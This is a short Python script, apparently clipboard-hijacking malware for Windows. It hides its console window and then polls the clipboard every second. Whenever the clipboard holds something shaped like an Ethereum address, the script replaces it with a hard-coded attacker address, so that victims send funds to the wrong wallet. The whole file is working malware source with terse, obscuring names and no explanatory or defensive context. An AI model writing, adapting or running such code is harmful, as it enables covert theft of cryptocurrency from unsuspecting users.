import win32clipboard as w
import time as t
import re
import os
import ctypes

m = "0xMaliciousEthereumAddress000000000000000000000"
r = r"^0x[a-fA-F0-9]{40}$"

def g():
    try:
        w.OpenClipboard()
        d = w.GetClipboardData()
        w.CloseClipboard()
        return d
    except:
        return None

def s(d):
    try:
        w.OpenClipboard()
        w.EmptyClipboard()
        w.SetClipboardText(d)
        w.CloseClipboard()
    except:
        pass

def c():
    while True:
        d = g()
        if d:
            d = d.strip()
            if re.match(r, d):
                s(m)
        t.sleep(1)

def h():
    if os.name == "nt":
        k = ctypes.windll.kernel32
        u = ctypes.windll.user32
        S = 0
        h = k.GetConsoleWindow()
        if h:
            u.ShowWindow(h, S)

if __name__ == "__main__":
    h()
    c()
